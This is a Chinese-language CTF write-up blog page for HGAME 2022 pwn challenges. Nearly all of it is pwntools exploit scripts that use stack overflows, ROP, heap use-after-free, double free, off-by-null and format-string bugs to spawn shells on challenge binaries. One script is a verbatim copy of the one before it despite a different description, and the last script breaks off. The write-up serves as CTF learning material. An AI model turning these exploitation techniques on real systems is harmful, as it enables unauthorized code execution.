@@ -1,0 +1,1160 @@
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<title>2022hgamectf - triplewings</title>
+<link rel="shortcut icon" href="https://kfxp12138.github.io//favicon.ico">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.2.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css">
+<link rel="stylesheet" href="https://kfxp12138.github.io//media/css/tailwind.css">
+<link rel="stylesheet" href="https://kfxp12138.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="2022hgamectf - triplewings - Atom Feed" href="https://kfxp12138.github.io//atom.xml">
+
+    
+
+  <meta name="description" content="2022的重置更新，就从这里开始吧~
+
+week1
+gdb
+
+触发gets漏洞，拿到shell
+
+from pwn import *
+context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
+..." />
+  <meta property="og:title" content="2022hgamectf - triplewings">
+  <meta property="og:description" content="2022的重置更新，就从这里开始吧~
+
+week1
+gdb
+
+触发gets漏洞，拿到shell
+
+from pwn import *
+context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
+..." />
+  <meta property="og:type" content="articles">
+  <meta property="og:url" content="https://kfxp12138.github.io/post/2022hgamectf/" />
+  <meta property="og:image" content="https://kfxp12138.github.io//images/avatar.png">
+  <meta property="og:image:height" content="630">
+  <meta property="og:image:width" content="1200">
+  <meta name="twitter:title" content="2022hgamectf - triplewings">
+  <meta name="twitter:description" content="2022的重置更新，就从这里开始吧~
+
+week1
+gdb
+
+触发gets漏洞，拿到shell
+
+from pwn import *
+context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
+...">
+  <meta name="twitter:card" content="summary_large_image">
+  <link rel="canonical" href="https://kfxp12138.github.io/post/2022hgamectf/">
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css">
+ 
+  
+    <link rel="stylesheet" href="https://kfxp12138.github.io//media/css/prism-atom-dark.css">
+  
+
+  
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+  
+</head>
+
+<body>
+  <div class="antialiased flex flex-col min-h-screen" id="app">
+    <a href="https://kfxp12138.github.io/" class="fixed top-0 left-0 mt-4 bg-black text-white dark:text-gray-700 dark:bg-yellow-50 dark:hover:bg-black dark:hover:text-white inline-flex p-2 pl-8 hover:text-gray-700 hover:bg-yellow-50 font-bold z-10 transition-fast animated fadeInLeft">
+      triplewings
+    </a>
+    <div class="max-w-4xl w-full mx-auto">
+      <div class="shadow-box bg-white dark:bg-gray-600 rounded-lg pt-32 md:pt-64 px-4 md:px-8 pb-8 animated fadeIn mb-8">
+        <h1 class="text-5xl font-semibold leading-normal pb-8 mb-8 border-b-8 border-gray-700">
+          2022hgamectf
+        </h1>
+        
+        <div class="mb-8 flex flex-wrap">
+          <div class="text-gray-400 text-sm mr-4">2022-02-28 · 23 min read</div>
+          
+        </div>
+        <div class="markdown mb-8" v-pre>
+          <p>2022的重置更新，就从这里开始吧~</p>
+<!-- more -->
+<h1 id="week1">week1</h1>
+<h2 id="gdb">gdb</h2>
+<ul>
+<li>触发gets漏洞，拿到shell</li>
+</ul>
+<pre><code class="language-python">from pwn import *
+context(os='linux', arch='amd64', log_level='debug')
+# p = remote(&quot;chuj.top&quot;, 50684)
+p = process(&quot;./a.out&quot;)
+p.recvuntil(b&quot;word&quot;)
+
+payload = p64(0xb0361e0e8294f147) + p64(0x8c09e0c34ed8a6a9)
+
+p.send(payload)
+
+p.recvuntil(b&quot;\x7f&quot;)
+p.recv(2)
+canary = u64(p.recv(8))
+print(hex(canary))
+p.send(b&quot;a&quot;*24 + p64(canary) + b&quot;a&quot;*8 + p64(0x401256))
+p.interactive()
+</code></pre>
+<h2 id="pwn_land1">pwn_land1</h2>
+<ul>
+<li>baby rop，改puts</li>
+</ul>
+<pre><code class="language-python">from pwn import *
+
+context(os='linux', arch='amd64', log_level='debug')
+
+p = process(&quot;./a.out&quot;)
+# p = remote(&quot;chuj.top&quot;, 31470)
+libc = ELF(&quot;libc-2.31.so&quot;)
+
+pop_rdi = 0x0000000000401313
+pop_rsi_r15 = 0x0000000000401311
+puts_got = 0x404020
+puts_plt = 0x401090
+
+payload = b&quot;a&quot;*44 + b&quot;\x2c&quot; + b&quot;\x00&quot;*3 + b&quot;a&quot;*8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(0x4011B6) + b&quot;\n&quot;
+# gdb.attach(p, &quot;b *0x4011B6&quot;)
+p.send(payload)
+p.recvuntil(b&quot;\n&quot;)
+libc.address = u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))  - libc.sym[&quot;puts&quot;]
+print(hex(libc.address))
+
+sh = libc.search(b'/bin/sh').__next__()
+system = libc.sym['execv']
+
+payload2 = b&quot;b&quot;*44 + b&quot;\x2c&quot; + b&quot;\x00&quot;*3 + b&quot;c&quot;*8 + p64(pop_rsi_r15) + p64(0)*2 +p64(pop_rdi) + p64(sh) +p64(system) + b&quot;\n&quot;
+
+p.send(payload2)
+
+p.interactive()
+</code></pre>
+<h2 id="pwn_land2">pwn_land2</h2>
+<ul>
+<li>利用多线程canary和tls离stack近的特点覆盖canary</li>
+</ul>
+<pre><code class="language-python">from pwn import *
+
+context(os='linux', arch='amd64', log_level='debug')
+
+p = process(&quot;./a.out&quot;)
+# p = remote(&quot;chuj.top&quot;, 31470)
+libc = ELF(&quot;libc-2.31.so&quot;)
+
+pop_rdi = 0x0000000000401313
+pop_rsi_r15 = 0x0000000000401311
+puts_got = 0x404020
+puts_plt = 0x401090
+
+payload = b&quot;a&quot;*44 + b&quot;\x2c&quot; + b&quot;\x00&quot;*3 + b&quot;a&quot;*8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(0x4011B6) + b&quot;\n&quot;
+# gdb.attach(p, &quot;b *0x4011B6&quot;)
+p.send(payload)
+p.recvuntil(b&quot;\n&quot;)
+libc.address = u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))  - libc.sym[&quot;puts&quot;]
+print(hex(libc.address))
+
+sh = libc.search(b'/bin/sh').__next__()
+system = libc.sym['execv']
+
+payload2 = b&quot;b&quot;*44 + b&quot;\x2c&quot; + b&quot;\x00&quot;*3 + b&quot;c&quot;*8 + p64(pop_rsi_r15) + p64(0)*2 +p64(pop_rdi) + p64(sh) +p64(system) + b&quot;\n&quot;
+
+p.send(payload2)
+
+p.interactive()
+</code></pre>
+<h2 id="orw">orw</h2>
+<ul>
+<li>ban了openat，用getsdent64读取目录，然后正常orw</li>
+</ul>
+<pre><code class="language-python">from pwn import *
+context(os='linux', arch='amd64', log_level='debug')
+p = process(&quot;vuln&quot;)
+p = remote(&quot;chuj.top&quot;, 41765)
+libc = ELF(&quot;libc-2.31.so&quot;)
+
+def proof(y):
+    may = string.ascii_letters+string.digits
+    for i in may:
+        for j in may:
+            for k in may:
+                for l in may:
+                    res = i +j +k +l
+                    if hashlib.sha256((res).encode()).hexdigest() == y:
+                        p.sendline(res)
+                        return
+    print('Wrong!')
+
+
+p.recvuntil(b&quot; == &quot;)
+a = p.recvuntil(b&quot;\n&quot;)[:-1].decode()
+print(a)
+proof(a)
+
+p.recvuntil(&quot;size?&quot;)
+
+p.sendline(&quot;-1&quot;)
+
+p.recvuntil(&quot;content?&quot;)
+
+# gdb.attach(p, &quot;b *0x401311&quot;)
+
+pop_rdi = 0x0000000000401443
+pop_rsi_r15 = 0x0000000000401441
+write_got = 0x404018
+write_plt = 0x401080
+
+main = 0x401311
+leave = 0x4013DB
+read_plt = 0x4010A0
+bss = 0x404060 + 0x100
+
+payload = b&quot;a&quot;*40 + p64(0xffffffffffffffff) + p64(bss)
+payload += p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(bss) + p64(0) + p64(read_plt) + p64(main)
+p.send(payload)
+p.recvuntil(&quot;done!&quot;)
+payload2 = p32(main) + b&quot;\x00&quot;*2
+p.send(payload2)
+p.recvuntil(&quot;size?\n&quot;)
+
+p.sendline(b&quot;-1&quot;)
+
+p.recvuntil(&quot;content?&quot;)
+
+payload = b&quot;a&quot;*40 + p64(0xffffffffffffffff) + p64(bss-0x8)
+payload += p64(pop_rsi_r15) + p64(write_got) + p64(0) + p64(write_plt) + p64(leave) + p64(main)
+
+
+p.send(payload)
+
+libc.address = u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))  - libc.sym[&quot;write&quot;]
+
+
+print(hex(libc.address))
+
+p.recvuntil(&quot;size?&quot;)
+
+p.sendline(&quot;-1&quot;)
+
+p.recvuntil(&quot;content?&quot;)
+
+libc_pop_rax = 0x000000000004a550
+libc_pop_rax_rdx_rbx = 0x0000000000162865
+libc_pop_rdx_r12 = 0x000000000011c371
+libc_pop_rcx = 0x000000000009f822
+
+payload = b&quot;./&quot; + b&quot;\x00&quot;*14 + b&quot;a&quot;*0x18 + p64(0xffffffffffffffff) + b&quot;a&quot;*8
+payload += p64(libc.address + libc_pop_rax_rdx_rbx) + p64(2) + p64(0) + p64(0) + p64(pop_rdi) + p64(0x404130) + p64(pop_rsi_r15) + p64(0) + p64(0) + p64(libc.sym[&quot;alarm&quot;] + 9)
+
+payload += p64(pop_rdi) + p64(3) + p64(pop_rsi_r15) + p64(0x404280) + p64(0)
+payload += p64(libc_pop_rdx_r12 + libc.address) + p64(0x200) + p64(0) 
+payload += p64(libc_pop_rcx + libc.address) +p64(0x404280 + 0x200)
+payload += p64(libc.sym[&quot;getdents64&quot;])
+
+payload += p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(0x404280) + p64(0) + p64(libc_pop_rdx_r12 + libc.address) + p64(0x200) + p64(0) + p64(libc.sym[&quot;write&quot;]) + p64(main)
+
+
+p.send(payload)
+p.recvuntil(b&quot;done&quot;)
+p.recvuntil(b&quot;flag&quot;)
+tail = p.recv(20)
+
+
+# tail = b&quot;a74248296b5d7f3d2b01&quot;
+
+p.recvuntil(&quot;size?&quot;)
+
+p.sendline(&quot;-1&quot;)
+
+p.recvuntil(&quot;content?&quot;)
+
+payload = b&quot;./flag&quot; + tail + b&quot;\x00&quot;*6 + b&quot;a&quot;*8 + p64(0xffffffffffffffff) + b&quot;a&quot;*8
+payload += p64(libc.address + libc_pop_rax_rdx_rbx) + p64(2) + p64(0) + p64(0) + p64(pop_rdi) + p64(0x404228) + p64(pop_rsi_r15) + p64(0) + p64(0) + p64(libc.sym[&quot;alarm&quot;] + 9)
+payload += p64(pop_rdi) + p64(4) + p64(pop_rsi_r15) + p64(bss- 0xc0) + p64(0) + p64(libc.address+libc_pop_rdx_r12) + p64(0x100) + p64(0)
+payload += p64(libc.sym[&quot;read&quot;])
+payload += p64(pop_rdi) + p64(1) + p64(libc.sym[&quot;write&quot;])
+
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<h1 id="week2">week2</h1>
+<h2 id="blind">blind</h2>
+<p>访问 <code>proc/self/mem</code> 即可修改当前进程的内存， <code>.text</code> 段也是可修改的</p>
+<pre><code class="language-python">from pwn import *
+
+context(os='linux', arch='amd64', log_level='debug')
+
+p = remote(&quot;chuj.top&quot;, 51808)
+libc = ELF(&quot;./libc.so.6&quot;)
+
+def proof(y):
+    may = string.ascii_letters+string.digits
+    for i in may:
+        for j in may:
+            for k in may:
+                for l in may:
+                    res = i +j +k +l
+                    if hashlib.sha256((res).encode()).hexdigest() == y:
+                        p.sendline(res)
+                        return
+    print('Wrong!')
+
+
+p.recvuntil(b&quot; == &quot;)
+a = p.recvuntil(b&quot;\n&quot;)[:-1].decode()
+print(a)
+proof(a)
+
+p.recvuntil(&quot;write: &quot;)
+
+libc.address = int(p.recvuntil('\n')[:-1], base = 16) - libc.sym[&quot;write&quot;]
+print(hex(libc.address))
+p.sendlineafter(&quot;&gt;&gt; &quot;, b'/proc/self/mem\x00')
+p.sendlineafter(&quot;&gt;&gt; &quot;, str(libc.sym[&quot;__libc_start_main&quot;]))
+payload = asm(shellcraft.sh())
+payload = payload.rjust(0x300, asm('nop')) + b'\n'
+p.sendafter(&quot;&gt;&gt; &quot;, payload)
+
+p.interactive()
+</code></pre>
+<h2 id="oldfashion_note">oldfashion_note</h2>
+<p>uaf 2.31 打 <code>fastbins</code></p>
+<pre><code class="language-python">from pwn import *
+
+context(os='linux', arch='amd64', log_level='debug')
+
+p = process(&quot;./note&quot;)
+p = remote(&quot;chuj.top&quot;, 51445)
+libc = ELF(&quot;./libc-2.31.so&quot;)
+
+def proof(y):
+    may = string.ascii_letters+string.digits
+    for i in may:
+        for j in may:
+            for k in may:
+                for l in may:
+                    res = i +j +k +l
+                    if hashlib.sha256((res).encode()).hexdigest() == y:
+                        p.sendline(res)
+                        return
+    print('Wrong!')
+
+
+p.recvuntil(b&quot; == &quot;)
+a = p.recvuntil(b&quot;\n&quot;)[:-1].decode()
+print(a)
+proof(a)
+
+
+def menu(i):
+    p.sendlineafter(b&quot;farewell&quot;, str(i))
+
+def add(idx, size, content):
+    menu(1)
+    p.sendlineafter(b&quot;index?&quot;, str(idx))
+    p.sendlineafter(b&quot;size?&quot;, str(size))
+    p.sendafter(b&quot;content?&quot;, content)
+
+def show(idx):
+    menu(2)
+    p.sendlineafter(b&quot;index?&quot;, str(idx))
+
+def free(idx):
+    menu(3)
+    p.sendlineafter(b&quot;index?&quot;, str(idx))
+
+
+for i in range(8):
+    add(i, 0x80, b&quot;aaa&quot;)
+
+for i in range(7):
+    free(7-i)
+
+free(0)
+show(0)
+
+libc.address = u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;)) - 96 - 0x10 - libc.sym[&quot;__malloc_hook&quot;]
+print(hex(libc.address))
+
+for i in range(8):
+    add(i, 0x80, b&quot;bbb&quot;)
+
+for i in range(9):
+    add(i, 0x20, b&quot;ccc&quot;)
+
+for i in range(8):
+    free(8-i)
+
+free(0)
+free(1)
+
+for i in range(2, 9):
+    add(i, 0x20, b&quot;ddd&quot;)
+
+add(1, 0x20, p64(libc.sym[&quot;__free_hook&quot;]))
+add(0, 0x20, b&quot;/bin/sh\x00&quot;)
+add(1, 0x20, b&quot;eee&quot;)
+add(2, 0x20, p64(libc.sym[&quot;system&quot;]))
+free(0)
+
+
+
+p.interactive()
+</code></pre>
+<h2 id="echo-sever">echo sever</h2>
+<p>堆上的格式化字符串， 打<code>realloc</code>， <code>og</code>填到<code>malloc_hook</code></p>
+<pre><code class="language-python">from pwn import *
+
+context(os='linux', arch='amd64', log_level='debug')
+
+p = process(&quot;./echo&quot;)
+p = remote(&quot;chuj.top&quot;, 52259)
+libc = ELF(&quot;./libc-2.31.so&quot;)
+
+def echo(length, content):
+    p.sendlineafter(b&quot;your content's length:&quot;, str(length))
+    p.send(content)
+
+def proof(y):
+    may = string.ascii_letters+string.digits
+    for i in may:
+        for j in may:
+            for k in may:
+                for l in may:
+                    res = i +j +k +l
+                    if hashlib.sha256((res).encode()).hexdigest() == y:
+                        p.sendline(res)
+                        return
+    print('Wrong!')
+
+
+p.recvuntil(b&quot; == &quot;)
+a = p.recvuntil(b&quot;\n&quot;)[:-1].decode()
+print(a)
+proof(a)
+
+
+echo(0x450, b&quot;%3$pzz&quot;)
+p.recvuntil(&quot;\n&gt;&gt; &quot;)
+libc.address = int(p.recvuntil(&quot;zz&quot;)[:-2].decode(), 16) + 895550 - 0x10 - libc.sym[&quot;__malloc_hook&quot;]
+echo(0x450, b&quot;%6$pzz&quot;)
+p.recvuntil(&quot;\n&gt;&gt; &quot;)
+heap_0 = int(p.recvuntil(&quot;zz&quot;)[:-2].decode(), 16) - 0x10
+
+echo(0x450, b&quot;%4$pzz&quot;)
+p.recvuntil(&quot;\n&gt;&gt; &quot;)
+heap_fastbins = int(p.recvuntil(&quot;zz&quot;)[:-2].decode(), 16)
+
+print(hex(libc.address))
+print(hex(heap_0))
+print(hex(heap_0 &amp; 0xff))
+print(hex(heap_fastbins))
+echo(0x450, b&quot;aaa&quot;)
+echo(0x3e0, b&quot;aaa&quot;)
+echo(0x370, b&quot;aaa&quot;)
+echo(0x300, b&quot;aaa&quot;)
+echo(0x290, b&quot;aaa&quot;)
+echo(0x220, b&quot;aaa&quot;)
+echo(0x1b0, b&quot;aaa&quot;)
+echo(0x140, b&quot;aaa&quot;)
+echo(0xd0, b&quot;aaa&quot;)
+
+echo(0x60, b&quot;aaa&quot;)
+
+
+echo(0x60, b&quot;%&quot; + str(heap_0 &amp; 0xff).encode()  + b&quot;c%6$hhn&quot;)
+echo(0x60, b&quot;%&quot; + str((heap_fastbins + 0xe0) &amp; 0xffff).encode()  + b&quot;c%10$hn&quot;)
+
+echo(0x60, p64(libc.sym[&quot;__free_hook&quot;]))
+echo(0, b&quot;&quot;)
+
+echo(0x60, b&quot;aaa&quot;)
+echo(0x60, b&quot;%10$ln&quot;)
+echo(0x60, b&quot;aaa&quot;)
+echo(0x60, b&quot;%10$ln&quot;)
+echo(0x60, b&quot;aaa&quot;)
+echo(0x60, b&quot;%10$ln&quot;)
+
+echo(0x60, b&quot;aaa&quot;)
+echo(0x60, b&quot;%10$ln&quot;)
+echo(0x60, b&quot;aaa&quot;)
+echo(0x60, b&quot;%10$ln&quot;)
+echo(0x60, b&quot;aaa&quot;)
+echo(0x60, b&quot;%10$ln&quot;)
+echo(0x60, b&quot;aaa&quot;)
+echo(0x60, b&quot;%10$ln&quot;)
+
+
+echo(0x60, b&quot;%10$ln\x00\x00&quot; + p64(0)*2 + p64(0x51))
+echo(0x60, b&quot;%96c%10$hhn&quot; + b&quot;\x00&quot;*5 + p64(0)*7 + p64(0x41))
+echo(0x30, p64(0)*3 + p64(0x71) + p64(libc.sym[&quot;__realloc_hook&quot;] - 27))
+echo(0x30, b&quot;%10$ln&quot;)
+
+echo(0x60, b&quot;aaa&quot;)
+
+echo(0x60, b&quot;%10$ln&quot;)
+# gdb.attach(p, &quot;b *$rebase(0x129F)&quot;)
+echo(0x60, b&quot;%10$ln&quot; + b&quot;\x00&quot;*5 + p64(0)*2 + p64(0) + p64(libc.address + 0xe6c81))
+# echo(0x0, b&quot;&quot;)
+echo(0x0, b&quot;aaa&quot;)
+# %224c%4$hhn
+
+p.interactive()
+
+# 0xe6c7e execve(&quot;/bin/sh&quot;, r15, r12)
+# constraints:
+#   [r15] == NULL || r15 == NULL
+#   [r12] == NULL || r12 == NULL
+
+# 0xe6c81 execve(&quot;/bin/sh&quot;, r15, rdx)
+# constraints:
+#   [r15] == NULL || r15 == NULL
+#   [rdx] == NULL || rdx == NULL
+
+# 0xe6c84 execve(&quot;/bin/sh&quot;, rsi, rdx)
+# constraints:
+#   [rsi] == NULL || rsi == NULL
+#   [rdx] == NULL || rdx == NULL
+
+</code></pre>
+<h1 id="week3">week3</h1>
+<h2 id="changeable-note">changeable note</h2>
+<p>2.23 打<code>stdout</code></p>
+<pre><code class="language-python">from pwn import *
+
+context(os='linux', arch='amd64', log_level='debug')
+
+p = process(&quot;./note&quot;)
+p = remote(&quot;chuj.top&quot;, 52401)
+libc = ELF(&quot;./libc-2.23.so&quot;)
+
+
+def proof(y):
+    may = string.ascii_letters+string.digits
+    for i in may:
+        for j in may:
+            for k in may:
+                for l in may:
+                    res = i +j +k +l
+                    if hashlib.sha256((res).encode()).hexdigest() == y:
+                        p.sendline(res)
+                        return
+    print('Wrong!')
+
+
+p.recvuntil(b&quot; == &quot;)
+a = p.recvuntil(b&quot;\n&quot;)[:-1].decode()
+print(a)
+proof(a)
+
+def menu(i):
+    p.sendlineafter(b&quot;4. farewell&quot;, str(i))
+
+def add(idx, size, content):
+    menu(1)
+    p.sendlineafter(b&quot;index?&quot;, str(idx))
+    p.sendlineafter(b&quot;size?&quot;, str(size))
+    p.sendafter(b&quot;content?&quot;, content)
+
+def edit(idx, content):
+    menu(2)
+    p.sendlineafter(b&quot;index?\n&gt;&gt; &quot;, str(idx))
+    p.sendline(content)
+
+def free(idx):
+    menu(3)
+    p.sendlineafter(b&quot;index?&quot;, str(idx))
+
+
+add(0,0x30,b&quot;aaa&quot;)
+add(1,0x60,b&quot;aaa&quot;)
+add(2,0x60,p64(0)*5 + p64(0x41))
+add(3,0x10,b&quot;aaa&quot;)
+add(4,0x10,b&quot;aaa&quot;)
+
+edit(1, p64(0)*9 + p64(0x21))
+edit(0, p64(0)*7 + p64(0xe1))
+free(1)
+free(2)
+
+add(5,0x40,b&quot;aaa&quot;)
+add(6,0x10,b&quot;aaa&quot;)
+add(7,0x20,b&quot;\xdd\x25&quot;)
+add(8,0x30,b&quot;aaa&quot;)
+edit(6, p64(0)*3 + b&quot;\x71&quot;)
+add(9, 0x60, b&quot;\xdd\x25&quot;)
+add(10, 0x60, b&quot;\x00&quot;*0x33 + p64(0xfbad1887) +p64(0)*3 + p8(0x88))
+libc.address = u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;)) - libc.sym['_IO_2_1_stdin_']
+print(hex(libc.address))
+edit(0, p64(0)*7 + p64(0xe1))
+free(9)
+free(5)
+add(5,0x40,b&quot;aaa&quot;)
+add(6,0x10,b&quot;aaa&quot;)
+add(7,0x20,p64(libc.sym[&quot;__malloc_hook&quot;] - 0x23))
+add(8,0x30,b&quot;aaa&quot;)
+edit(6, p64(0)*3 + b&quot;\x71&quot;)
+add(9, 0x60, b&quot;aaa&quot;)
+
+add(10, 0x60, b&quot;\x00&quot;*3 + p64(0)*2 + p64(libc.address + 0xf03a4))
+
+# gdb.attach(p, &quot;b edit_note&quot;)
+edit(6, p64(0)*3 + b&quot;\x41&quot;)
+free(9)
+
+
+p.interactive()
+
+# 0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)
+# constraints:
+#   rax == NULL
+
+# 0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)
+# constraints:
+#   [rsp+0x30] == NULL
+
+# 0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)
+# constraints:
+#   [rsp+0x50] == NULL
+
+# 0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)
+# constraints:
+#   [rsp+0x70] == NULL
+</code></pre>
+<h2 id="elder_note">elder_note</h2>
+<p><code>double free</code>写<code>malloc_hook</code>, <code>double_free</code>报错拿shell</p>
+<pre><code class="language-python">from pwn import *
+
+context(os='linux', arch='amd64', log_level='debug')
+
+p = process(&quot;./note&quot;)
+p = remote(&quot;chuj.top&quot;, 52620)
+libc = ELF(&quot;./libc-2.23.so&quot;)
+
+
+def proof(y):
+    may = string.ascii_letters+string.digits
+    for i in may:
+        for j in may:
+            for k in may:
+                for l in may:
+                    res = i +j +k +l
+                    if hashlib.sha256((res).encode()).hexdigest() == y:
+                        p.sendline(res)
+                        return
+    print('Wrong!')
+
+
+p.recvuntil(b&quot; == &quot;)
+a = p.recvuntil(b&quot;\n&quot;)[:-1].decode()
+print(a)
+proof(a)
+
+def menu(i):
+    p.sendlineafter(b&quot;4. farewell&quot;, str(i))
+
+def add(idx, size, content):
+    menu(1)
+    p.sendlineafter(b&quot;index?&quot;, str(idx))
+    p.sendlineafter(b&quot;size?&quot;, str(size))
+    p.sendafter(b&quot;content?&quot;, content)
+
+def show(idx):
+    menu(2)
+    p.sendlineafter(b&quot;index?&quot;, str(idx))
+
+def free(idx):
+    menu(3)
+    p.sendlineafter(b&quot;index?&quot;, str(idx))
+
+add(0, 0x80, b&quot;aaa&quot;)
+add(1, 0x80, b&quot;aaa&quot;)
+free(0)
+show(0)
+p.recvuntil(&quot;&quot;)
+libc.address = u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;)) - 88 - 0x10 - libc.sym[&quot;__malloc_hook&quot;]
+
+
+add(0, 0x80, b&quot;aaa&quot;)
+add(0, 0x60, b&quot;aaa&quot;)
+add(1, 0x60, b&quot;aaa&quot;)
+add(2, 0x60, b&quot;/bin/sh&quot;)
+free(0)
+free(1)
+free(0)
+add(0, 0x60, p64(libc.sym[&quot;__malloc_hook&quot;] - 0x23))
+
+add(1, 0x60, b&quot;aaa&quot;)
+add(3, 0x60, b&quot;aaa&quot;)
+# gdb.attach(p, &quot;b add_note&quot;)
+
+print(hex(libc.address))
+add(4, 0x60, b&quot;aaa&quot; + p64(0)*2 + p64(libc.address + 0xf03a4) + p64(0))
+free(0)
+free(0)
+# free(2)
+
+p.interactive()
+
+# 0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)
+# constraints:
+#   rax == NULL
+
+# 0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)
+# constraints:
+#   [rsp+0x30] == NULL
+
+# 0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)
+# constraints:
+#   [rsp+0x50] == NULL
+
+# 0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)
+# constraints:
+#   [rsp+0x70] == NULL
+</code></pre>
+<h2 id="sized_note">sized_note</h2>
+<p>off by null, unlink unsorted bins</p>
+<pre><code class="language-python">from pwn import *
+
+context(os='linux', arch='amd64', log_level='debug')
+
+p = process(&quot;./note&quot;)
+p = remote(&quot;chuj.top&quot;, 52966)
+libc = ELF(&quot;./libc.so.6&quot;)
+
+
+def proof(y):
+    may = string.ascii_letters+string.digits
+    for i in may:
+        for j in may:
+            for k in may:
+                for l in may:
+                    res = i +j +k +l
+                    if hashlib.sha256((res).encode()).hexdigest() == y:
+                        p.sendline(res)
+                        return
+    print('Wrong!')
+
+
+p.recvuntil(b&quot; == &quot;)
+a = p.recvuntil(b&quot;\n&quot;)[:-1].decode()
+print(a)
+proof(a)
+
+def menu(i):
+    p.sendlineafter(b&quot;5. farewell&quot;, str(i))
+
+def add(idx, size, content):
+    menu(1)
+    p.sendlineafter(b&quot;index?&quot;, str(idx))
+    p.sendlineafter(b&quot;size?&quot;, str(size))
+    p.sendafter(b&quot;content?&quot;, content)
+
+def edit(idx, content):
+    menu(4)
+    p.sendlineafter(b&quot;index?\n&gt;&gt; &quot;, str(idx))
+    p.send(content)
+
+def free(idx):
+    menu(3)
+    p.sendlineafter(b&quot;index?&quot;, str(idx))
+
+def show(idx):
+    menu(2)
+    p.sendlineafter(b&quot;index?&quot;, str(idx))
+
+
+
+
+
+add(0, 0xf8, b&quot;aaa&quot;)
+add(1, 0x88, b&quot;aaa&quot;)
+add(2, 0xf8, b&quot;aaa&quot;)
+add(3, 0x88, b&quot;aaa&quot;)
+
+for i in range(7):
+    add(4+i, 0xf8, b&quot;aaa&quot;)
+
+for i in range(7):
+    free(10 - i)
+
+free(1)
+free(0)
+
+add(1, 0x88, b&quot;a&quot;*0x80+p64(0x90+0x100))
+free(2)
+
+for i in range(7):
+    add(4+i, 0xf8,&quot;/bin/sh\x00&quot;)
+add(0, 0xf8,&quot;cccc&quot;)
+show(1)
+libc.address = u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;)) - 96 - 0x10 - libc.sym['__malloc_hook']
+print(hex(libc.address))
+# gdb.attach(p, &quot;b *$rebase(0x144B)&quot;)
+add(2, 0x88,&quot;cccc&quot;)
+free(2)
+edit(1, p64(libc.sym[&quot;__free_hook&quot;])[:-1])
+add(13, 0x88, p64(libc.sym[&quot;__free_hook&quot;]))
+
+add(14, 0x88, p64(libc.sym[&quot;system&quot;]))
+free(5)
+
+
+
+p.interactive()
+
+# 0x4f3d5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)
+# constraints:
+#   rsp &amp; 0xf == 0
+#   rcx == NULL
+
+# 0x4f432 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)
+# constraints:
+#   [rsp+0x40] == NULL
+
+# 0x10a41c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)
+# constraints:
+#   [rsp+0x70] == NULL
+</code></pre>
+<h1 id="week4">week4</h1>
+<h2 id="vector">vector</h2>
+<ul>
+<li>了解vector的申请原理，制造double_free</li>
+</ul>
+<pre><code class="language-python">from pwn import *
+
+context(os='linux', arch='amd64', log_level='debug')
+
+p = process(&quot;./vector&quot;)
+# p = remote(&quot;chuj.top&quot;, 51445)
+libc = ELF(&quot;./libc.so.6&quot;)
+
+# def proof(y):
+#     may = string.ascii_letters+string.digits
+#     for i in may:
+#         for j in may:
+#             for k in may:
+#                 for l in may:
+#                     res = i +j +k +l
+#                     if hashlib.sha256((res).encode()).hexdigest() == y:
+#                         p.sendline(res)
+#                         return
+#     print('Wrong!')
+
+
+# p.recvuntil(b&quot; == &quot;)
+# a = p.recvuntil(b&quot;\n&quot;)[:-1].decode()
+# print(a)
+# proof(a)
+
+def menu(i):
+    p.sendlineafter(b&quot;farewell&quot;, str(i))
+
+def add(idx, size, content):
+    menu(1)
+    p.sendlineafter(b&quot;index?&quot;, str(idx))
+    p.sendlineafter(b&quot;size?&quot;, str(size))
+    p.sendafter(b&quot;content?&quot;, content)
+
+def show(idx):
+    menu(3)
+    p.sendlineafter(b&quot;index?&quot;, str(idx))
+
+def free(idx):
+    menu(4)
+    p.sendlineafter(b&quot;index?&quot;, str(idx))
+
+def move(f, t):
+    menu(5)
+    for i in range(f):
+        p.sendlineafter(&quot;[1/0]\n&gt;&gt; &quot;, b&quot;0&quot;)
